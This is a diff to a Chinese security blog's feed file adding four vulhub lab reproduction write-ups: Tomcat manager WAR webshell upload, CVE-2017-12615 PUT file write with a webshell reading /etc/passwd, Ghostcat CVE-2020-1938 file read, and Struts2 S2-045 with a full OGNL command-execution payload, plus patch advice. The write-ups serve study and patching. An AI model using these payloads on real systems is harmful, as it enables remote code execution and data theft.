@@ -4,6 +4,106 @@
   
     
     <entry>
+      <title>Tomcat7-Password+Getshell</title>
+      <link href="/2023/02/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat7-Password-Getshell/"/>
+      <url>/2023/02/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat7-Password-Getshell/</url>
+      
+        <content type="html"><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Tomcat 支持通过后端部署 war 文件，所以我们可以直接将 webshell 放入 Web 目录下。为了访问后端，需要权限。</p><p>Tomcat7+ 的权限如下：</p><ul><li>经理（后台管理）<ul><li>管理器-GUI（HTML 页面的权限）</li><li>管理员状态（查看状态的权限）</li><li>管理器脚本（文本界面的权限和状态权限）</li><li>管理器-JMX（JMX 权限和状态权限）</li></ul></li><li>主机管理器（虚拟主机管理）<ul><li>admin-gui （HTML 页面的权限）</li><li>管理员脚本（文本界面的权限）</li></ul></li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问页面：</span><br><span class="line">http://10.9.75.198:8080/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907174328630.png" alt="image-20230907174328630"></p><h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">登录</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907174354463.png" alt="image-20230907174354463"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907174534747.png" alt="image-20230907174534747"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907174555801.png" alt="image-20230907174555801"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将一个文件打包为WAR，上传，获取shell</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907192210817.png" alt="image-20230907192210817"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907192223867.png" alt="image-20230907192223867"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上传成功，打开上传的页面</span><br><span class="line">http://10.9.75.198:8080/2/2.jsp</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907192304544.png" alt="image-20230907192304544"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907192331290.png" alt="image-20230907192331290"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907192352407.png" alt="image-20230907192352407"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Tomcat-PUT方法任意写文件漏洞</title>
+      <link href="/2023/02/07/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat-PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2023/02/07/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat-PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>CVE-2017-12615 对应的漏洞为任意文件写入，由于配置不当（非默认配置），导致可以使用 PUT 方法上传任意文件 。Tomcat设置了写权限（readonly&#x3D;false），导致可以使用PUT方法上传任意文件</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Apache Tomcat 7.0.0 - 7.0.81</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问页面</span><br><span class="line">http://10.9.75.198:8080/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907193826613.png" alt="image-20230907193826613"></p><h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用nuclei工具直接扫描漏洞</span><br><span class="line">./nuclei -u 10.9.75.198</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907195134018.png" alt="image-20230907195134018"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907204444637.png" alt="image-20230907204444637"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.9.75.198:8080/poc.jsp?cmd=cat+%2Fetc%2Fpasswd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907204517774.png" alt="image-20230907204517774"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907204545865.png" alt="image-20230907204545865"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Aapache-Tomcat</title>
+      <link href="/2023/02/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Aapache-Tomcat/"/>
+      <url>/2023/02/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Aapache-Tomcat/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Aapache-Tomcat-AJP-文件包含漏洞-CVE-2020-1938"><a href="#Aapache-Tomcat-AJP-文件包含漏洞-CVE-2020-1938" class="headerlink" title="Aapache Tomcat AJP __ 文件包含漏洞 __ CVE-2020-1938"></a>Aapache Tomcat AJP __ 文件包含漏洞 __ CVE-2020-1938</h1><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><a href="https://www.chaitin.cn/en/ghostcat">Ghostcat</a>是Chaitin Tech安全研究员发现的Tomcat中的一个严重漏洞，由于Tomcat AJP协议中的缺陷，攻击者可以读取或包含Tomcat的Webapp目录中的任何文件。例如，攻击者可以读取 Web 应用配置文件或源代码。此外，如果目标Web应用具有文件上传功能，攻击者可以通过Ghostcat漏洞利用文件包含漏洞在目标主机上执行恶意代码。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>Apache Tomcat 6</p><p>Apache Tomcat 7 &lt; 7.0.100</p><p>Apache Tomcat 8 &lt; 8.5.51</p><p>Apache Tomcat 9 &lt; 9.0.31</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问页面</span><br><span class="line">http://10.9.75.198:8080/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907170255435.png" alt="image-20230907170255435"></p><h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找到要运行的文件</span><br><span class="line">cd tools/apache-tomcat/CNVD-2020-10487-Tomcat-Ajp-lfi</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907172333707.png" alt="image-20230907172333707"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">读取文件：</span><br><span class="line">python2 &quot;CNVD-2020-10487-Tomcat-Ajp-lfi.py&quot; -p 8009 -f /WEB-INF/web.xml 10.9.75.198 </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20231030203934568.png" alt="image-20231030203934568"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>S2-045</title>
+      <link href="/2023/01/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-045/"/>
+      <url>/2023/01/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-045/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Struts2-S2-045-Remote-Code-Execution-Vulnerablity-CVE-2017-5638"><a href="#Struts2-S2-045-Remote-Code-Execution-Vulnerablity-CVE-2017-5638" class="headerlink" title="Struts2  __ S2-045 Remote Code Execution Vulnerablity __  CVE-2017-5638"></a>Struts2  __ S2-045 Remote Code Execution Vulnerablity __  CVE-2017-5638</h4><table><thead><tr><th>说明</th><th>内容</th></tr></thead><tbody><tr><td>漏洞编号</td><td>CVE-2017-5638</td></tr><tr><td>漏洞名称</td><td>S2-045 Remote Code Execution Vulnerablity</td></tr><tr><td>影响范围</td><td>Struts 2.3.5 - Struts 2.3.31, <br>Struts 2.5 - Struts 2.5.10</td></tr><tr><td>漏洞描述</td><td>pache Struts2的Jakarta Multipart parser插件存在远程代码执行漏洞，<br>攻击者可以在使用该插件上传文件时，修改<a href="https://so.csdn.net/so/search?q=HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4&spm=1001.2101.3001.7020">HTTP请求头</a>中的Content-Type值来触发该漏洞，导致远程执行代码。</td></tr><tr><td>修复方案</td><td>一、修复方式： 升级Apache Struts版本至 2.3.32 or 2.5.10.1以上。<br/><br/>二、修复建议：在网络防护设备上配置过滤包含如下：<br/><br/>#nike&#x3D;’multipart&#x2F;form-data’<br/><br/>以及<br/><br/>#container&#x3D;#context[‘com.opensymphony.xwork2.ActionContext.container’<br/><br/></td></tr></tbody></table><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>Apache官方发布Struts 2 紧急漏洞公告（S2-045），CVE编号CVE-2017-5638。公告中披露 ，当基于Jakarta插件上传文件时，可导致远程代码执行。例如在系统中获得管理员权限，执行添加用户。可任意查看、修改或删除文件。造成机密数据泄露，重要信息遭到篡改等重大危害。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2.影响版本"></a>2.影响版本</h2><p>Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p><h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h2><h3 id="3-1基础环境"><a href="#3-1基础环境" class="headerlink" title="3.1基础环境"></a>3.1基础环境</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问`http://10.9.75.198:8080`即可看到上传页面</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230905201437413.png" alt="image-20230905201437413"></p><h3 id="3-2漏洞复现"><a href="#3-2漏洞复现" class="headerlink" title="3.2漏洞复现"></a>3.2漏洞复现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用burp抓包取数据包，然后Content-Type:更改为</span><br><span class="line"></span><br><span class="line">Content-Type:</span><br><span class="line">方法一</span><br><span class="line">%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;vulhub&#x27;,233*233)&#125;.multipart/form-data</span><br><span class="line">方法二</span><br><span class="line">&quot;%&#123;(#xxx=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;&quot;pwd&quot;&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230905203750220.png" alt="image-20230905203750220"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">成功显示</span><br></pre></td></tr></table></figure><h2 id="4-漏洞修复"><a href="#4-漏洞修复" class="headerlink" title="4.漏洞修复"></a>4.漏洞修复</h2><p>一、修复方式： 升级Apache Struts版本至 2.3.32 or 2.5.10.1以上。</p><p>二、修复建议：在网络防护设备上配置过滤包含如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#nike=&#x27;multipart/form-data&#x27;</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span><br></pre></td></tr></table></figure><p>字段串（及相关字符转义形式）的URL请求。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Apache_Shiro_1.2.4反序列化漏洞</title>
       <link href="/2023/01/24/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache-Shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
       <url>/2023/01/24/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache-Shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
